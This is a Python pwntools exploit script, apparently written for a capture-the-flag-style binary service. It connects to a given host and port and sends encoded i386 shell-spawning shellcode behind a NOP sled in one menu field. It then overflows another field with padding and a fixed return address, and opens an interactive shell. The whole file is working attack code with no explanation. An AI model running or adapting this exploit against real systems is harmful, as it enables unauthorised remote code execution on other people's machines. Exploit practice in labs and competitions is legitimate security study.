import os
import sys
from pwn import *
import time
import subprocess
import glob

def try_exploit(padding_length, host, port):
    # Set up context for remote connection
    context.log_level = 'debug'  # Enable debug logging
    context.arch = 'i386'  # Set architecture
    context.os = 'linux'   # Set OS
    
    # Connect to remote server
    print(f"[*] Connecting to {host}:{port}...")
    conn = remote(host, port)
    
    def print_output():
        while conn.can_recv(timeout=0.1):
            try:
                output = conn.recv(timeout=0.1).decode().strip()
                print(f"Output: {output}")
            except:
                pass
    
    def add_sequence(name, path, type_num, reason):
        try:
            conn.sendline(b'1')  # Choose add sequence
            time.sleep(0.5)
            print_output()
            conn.sendline(str(type_num).encode())  # Type (1 for Normal)
            time.sleep(0.5)
            print_output()
            print("sending name")
            conn.sendline(name)  # Name (already encoded)
            time.sleep(0.5)
            print_output()
            print("sending path")
            conn.sendline(path)  # Path (already encoded)
            time.sleep(0.5)
            print_output()
            print("sending reason")
            conn.sendline(reason.encode())  # Reason
            time.sleep(0.5)
            print_output()
            return True
        except Exception as e:
            print(f"Error in add_sequence: {e}")
            return False

    try:
        # Use Pwntools' shellcode generator with encoding
        shellcode = shellcraft.i386.linux.sh()
        shellcode = encode(asm(shellcode), avoid=b'\x0a\x0d\x04\x09\x0b')
        
        # Print the shellcode to check for problematic characters
        print(f"\n[*] Trying padding length: {padding_length}")
        print("[*] Shellcode bytes:", end=' ')
        for b in shellcode:
            print(f"\\x{b:02x}", end='')
        print()
        
        # Create the exploit sequence
        print("[*] Sending exploit sequence...")
        
        # Create overflow payload for path field with current padding length
        # Add NOP sled before the shellcode
        nop_sled = b'\x90' * 16  # 16 bytes of NOPs
        overflow = b'A' * padding_length + p32(0x0804c0d6)  # Return address
        
        success = add_sequence(
            name=nop_sled + shellcode,  # NOP sled + shellcode in name field
            path=overflow,  # Overflow in path field
            type_num=1,  # Normal type
            reason=""  # Empty reason to avoid interference
        )
        
        if not success:
            print("[!] Failed to add sequence")
            conn.close()
            return False
        
        print("[*] Exploit sent, waiting for shell...")
        conn.interactive()
        return True

    except KeyboardInterrupt:
        print("\nTerminating interaction.")
        return False
        
    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        # Close the connection
        conn.close()
        print("Connection closed.")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 exploit_remote.py <host> <port> <padding_length>")
        print("Example: python3 exploit_remote.py 192.168.1.100 1337 82")
        sys.exit(1)
    
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
        padding_length = int(sys.argv[3])
        try_exploit(padding_length, host, port)
    except ValueError:
        print("Error: port and padding_length must be numbers")
        sys.exit(1)

if __name__ == "__main__":
    main()
